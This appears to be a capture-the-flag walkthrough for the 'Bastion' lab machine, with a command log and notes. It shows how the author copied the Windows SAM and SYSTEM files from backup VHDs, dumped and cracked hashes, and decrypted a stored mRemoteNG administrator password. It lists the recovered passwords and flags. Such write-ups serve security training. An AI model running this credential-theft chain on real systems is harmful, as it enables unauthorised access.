# Bastion - Easy

```shell
nmap -T4 -p- -A -Pn -v 10.10.10.134

smbclient -L \\\\10.10.10.134

smbclient \\\\10.10.10.134\\backups
#get all files of interest

recurse
#recurse mode smbclient

ls
#shows all files in all directories
#most of them are just backup files

#attempt to browser vhd files
sudo apt-get install libguestfs-tools cifs-utils

sudo su
#switch to root user as we will be in /mnt

mkdir /mnt/remote

mkdir /mnt/vhd

cd /mnt/remote

mount -t cifs //10.10.10.134/backups /mnt/remote -o rw

cd /mnt/remote/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351

ls -la
#we can take a look at the bigger vhd file

guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd -v
#mount to /mnt/vhd

cd /mnt/vhd

ls -la

cd Users\L4mpje

#we can go through user files, but nothing important
find Desktop Documents Downloads -ls
#prints all files in these folders

#get local SAM database from vhd
cd /mnt/vhd/Windows/System32/config

cp SAM SYSTEM /home/sv/

exit
#exit and unmount everything

umount -l remote

umount -l vhd

cd

#now we can extract hashes
impacket-secretsdump -sam SAM -system SYSTEM local
#this gives us hashes, we can crack L4mpje hash using online services

ssh l4mpje@10.10.10.134

#get user flag

systeminfo
#access denied

whoami /priv

wmic product get name,version
#access denied

set
#view all env variables

#list installed programs
powershell -c "Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime"

powershell -c "Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name"

#check mRemoteNG passwords
cd C:\Users\L4mpje\AppData\Roaming\mRemoteNG

dir

type confCons.xml
#get the stored hash

#in attacker machine
#download the mRemoteNG decryptor script from GitHub
#run the Python script with found hash
python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
#cracks the hash

ssh administrator@10.10.10.134
#get root flag
```

* Open ports & services:

  * 22 - ssh - OpenSSH
  * 135 - msrpc - Microsoft Windows RPC
  * 445 - microsoft-ds - Windows Server 2016 Standard 14393
  * 5985 - http - Microsoft HTTPAPI httpd 2.0
  * 47001 - http - Microsoft HTTPAPI httpd 2.0
  * 49664-49670 - msrpc - Microsoft Windows RPC

* Enumerating SMB shares (port 445) shows that we have a Backups share that can be accessed; we can get all files from the shares and check for anything interesting.

* The backup share has many .vhd files, could be a part of backups for the machine; we can attempt to browse through these files.

* We can mount the vhd files using ```guestmount```, and extract local SAM database from ```C:\Windows\System32\config```.

* After extracting hashes with the help of ```impacket-secretsdump```, we get hashes for Administrator, Guest and L4mpje; but we are only able to crack L4mpje's hash - it gives us the password 'bureaulampje'.

* We can SSH into the victim machine using l4mpje creds now, and get the user flag from Desktop.

* We can begin looking for clues via enumeration.

* Going through user files and privileges does not show anything interesting; we can check all installed programs on machine.

* Now, one of the installed programs that seems out of place is mRemoteNG; we can look into this.

* By Googling, we can see that mRemoteNG stores its passwords in ```confCons.xml```, which is located in the user's AppData directory.

* From this file, we can get the stored hash for the Administrator user.

* We also have a Python script found by Googling, and it can help us in decrypting mRemoteNG password hashes.

* The script is able to crack the hash and we get the password 'thXLHM96BeKL0ER2'.

* With this, we can log into SSH as Administrator and get root flag.

```markdown
1. User flag - 7b31c89daa51654995c1f66998d80816

2. Root flag - 313db8c8f420ff545ed707a3a5f9fe20
```
